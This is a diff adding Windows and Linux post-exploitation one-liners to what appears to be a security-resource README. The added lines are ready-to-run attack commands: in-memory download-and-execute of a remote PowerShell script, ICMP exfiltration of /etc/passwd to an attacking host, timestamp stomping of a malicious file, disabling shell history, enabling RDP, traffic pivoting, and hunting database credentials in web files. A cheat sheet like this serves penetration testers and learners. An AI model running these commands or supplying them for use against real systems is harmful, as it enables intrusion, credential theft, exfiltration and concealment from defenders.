@@ -212,3 +212,51 @@ PS. A VERY big **thank you** to all the authors of these resources, for taking t
 [`Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]`](http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html)
 
 [`Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]`](http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html)
+
+
+
+### ~ Windows One-Liners ~ **[kindredsec](https://twitter.com/kindredsec)**
+*Obtain Permission String from All Services*
+`sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @sc sdshow %i & @echo ---------) & del a 2>nul & del b 2>nul`
+
+*Obtain the path of the executable called by a Windows service (good for checking Unquoted Paths*
+`sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul`
+
+*Forward traffic to an internal host*
+`netsh interface portproxy add v4tov4 listenport=*port* listenaddress=*ip* connectport=*port* connectaddress=*ip`
+
+*Download and execute a remote PowerShell script (all in-memory)*
+`iex (New-Object Net.Webclient).DownloadString('*remote_file*')`
+
+*Check the permissions of all binaries associated with services*
+`$list = Get-WmiObject win32_service | select -ExpandProperty PathName | Select-String -NotMatch svchost; foreach ( $path in $list ) { icacls $path 2>null | Select-String -NotMatch "Successfully processed" }`
+
+*Enable RDP (may also need firewall rule)*
+`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+
+
+
+### ~ Linux One-Liners ~ **[kindredsec](https://twitter.com/kindredsec)**
+*Stomp a timestamp to match other install-time files*
+`touch -a -m -t $(stat -c '%y' /bin/bash | cut -d ":" -f 1,2 | sed 's/[- :]//g') malicious_file.sh`
+
+*Prevent ran bash commands from being written to a history file*
+`export HISTFILE=/dev/null`
+
+*Exfiltrate users over ICMP*
+`while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) my_attacking_host; done < /etc/passwd`
+
+*Locate mySQL credentials within web files*
+`egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/www/* 2> /dev/null`
+
+*List all the SUID Binaries on a System*
+`find / -perm -4000 2>/dev/null`
+
+*Creates iptables rules to transparently route traffic destined to a specific port to an internal host*
+`iptables -t nat -A PREROUTING -i *interface* -p tcp --dport *port* -j DNAT --to-destination *remote_ip_address* & iptables -t nat -A POSTROUTING -o *interface* -p tcp --dport *port* -d *remote_ip_address* -j SNAT --to-source *local_ip_address*`
+
+*List all running processes being ran by users other than your current one*
+`ps -elf | grep -v $(whoami)`
+
+*List all system cronjobs*
+`for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done`
